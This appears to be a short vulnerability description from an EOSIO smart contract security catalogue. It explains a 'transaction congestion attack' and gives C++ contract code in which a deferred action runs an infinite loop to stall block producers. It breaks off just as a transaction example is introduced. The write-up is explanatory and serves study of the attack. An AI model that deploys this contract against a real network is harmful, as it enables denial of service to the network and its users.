## Description

This attack is named as `transaction congestion attack`. In EOSIO, deferred transactions originally have the top priority to ensure they are executed on time. Therefore, attackers can abuse this feature to paralyze the whole network.

## Attack instance

The below code snippet illustrates a malicious contract:

```c++
[[eosio::action]]
void deferred(name from, const string message) {
  while(true) {}
}

[[eosio::action]]
void send(name from, const string message, uint64_t delay) {
  eosio::transaction t{};

  t.actions.emplace_back(
    permission_level(from, N(active)),
    _self,
    N(deferred),
    std::make_tuple(from, message));
  
  // set delay in seconds
  t.delay_sec = delay;
  t.send(now(), from);
}
```

As we can see, the *send* will invoke *deferred*, where it executes a dead loop. Therefore, BPs will suffer the denial-of-service.

The following transaction illustrates the attack behavior:
